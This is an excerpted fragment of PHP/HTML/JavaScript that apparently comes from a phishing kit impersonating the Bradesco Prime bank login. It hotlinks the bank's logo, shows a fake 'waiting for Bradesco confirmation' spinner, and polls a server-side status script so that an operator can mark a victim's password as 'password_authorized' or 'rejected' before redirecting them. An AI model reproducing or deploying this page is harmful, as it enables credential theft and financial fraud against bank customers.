...
<div class="background">
  <div class="header">
    <div class="baseHeader">
      <img src="https://www.ib13.bradesco.com.br/ibpf/imagens/novologin/header-logo/bradesco-prime.png" alt="logo">
      <p id="data">
        <?php
          ...
          <div class="etapa-validacao">
            ...
            <div class="backgroundInput">
              ...
              <div id="key-loader" style="display: none; margin-top: 20px; text-align:center;">
                <div class="circle" style="width:40px;height:40px;border-radius:50%;background:linear-gradient(65deg, #142463 40%, #034694 110%);margin:auto;animation: pulse 1s infinite;"></div>
                <p style="margin-top:10px;color:#000000;">Aguardando confirmação do Bradesco, por favor aguarde!</p>
              </div>
          ...
          fetch(`verificar_status.php?id=<?php echo $clientId; ?>`)
            ...
            .then(json => {
              ...
              if (status === 'password_authorized') {
                window.location.href = '/primelogado.php';
              } else if (status === 'rejected') {
